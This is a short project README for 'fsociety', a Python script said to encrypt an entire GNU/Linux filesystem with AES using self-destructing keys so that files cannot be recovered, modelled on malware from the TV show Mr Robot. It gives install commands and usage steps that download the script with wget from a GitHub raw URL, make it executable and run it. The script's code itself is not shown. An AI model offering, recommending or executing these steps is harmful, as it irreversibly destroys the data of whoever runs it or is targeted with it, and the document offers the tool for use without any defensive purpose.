# fsociety
__WARNING: You will not be able to recover the files.__

This is intended to encrypt every bit of data in a GNU/Linux filesystem using 256-bit AES with 
self-destructing, randomly generated keys.

The [fuxsocy.py](https://i.imgur.com/tAvWBe6.jpg) script is based on [Darlene's malware](https://gifyu.com/images/ezgif.com-video-to-giff0eda.gif) from the TV show Mr Robot.

![alt-text](https://i.imgur.com/6RIogYa.jpg)

### Dependencies:

* python2.7
* pycrypto

```shell
sudo apt install python python-pip
```
```shell
sudo pip install pycrypto
```

### Usage:

```shell
wget https://raw.githubusercontent.com/joekendal/fsociety/master/fuxsocy.py
```
```shell
sudo chmod +x fuxsocy.py
```
```shell
./fuxsocy.py
```

### License

#### MIT
